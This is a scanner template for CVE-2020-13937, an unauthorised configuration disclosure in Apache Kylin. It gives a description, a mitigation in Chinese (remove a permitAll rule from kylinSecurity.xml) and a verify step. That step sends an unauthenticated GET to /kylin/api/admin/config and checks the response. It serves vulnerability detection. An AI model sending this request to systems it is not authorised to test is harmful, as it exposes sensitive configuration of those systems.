app: Apache Kylin
query: body:"Apache Kylin"
meta:
  name: Apache Kylin Unauthorized configuration disclosure (CVE-2020-13937)
  level: 3
  tags:
    - Disclosure of Sensitive Information
  description: Apache kylin has a restful API that exposes configuration information without authorization.\nAttackers can use this vulnerability to obtain sensitive information of the system.
  homepage: http://kylin.apache.org/
  author: Administrator
  references: https://blog.csdn.net/xuandao_ahfengren/article/details/114391966
  solution: |-
    升级到安全版本，或执行以下缓解措施：
    编辑 "$KYLIN_HOME/WEB-INF/classes/kylinSecurity.xml"；
    删除下列行 "<scr:intercept-url pattern="/api/admin/config" access="permitAll"/>"；
    重启 Kylin实例以使其生效。
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: GET
            path: /kylin/api/admin/config
            redirect: true
            header: [ ]
            params: ""
          response:
            - name: code
              value: "200"
              type: equals
            - name: body
              value: config
              type: contains
  create_at: "2022-05-23 10:50:18"
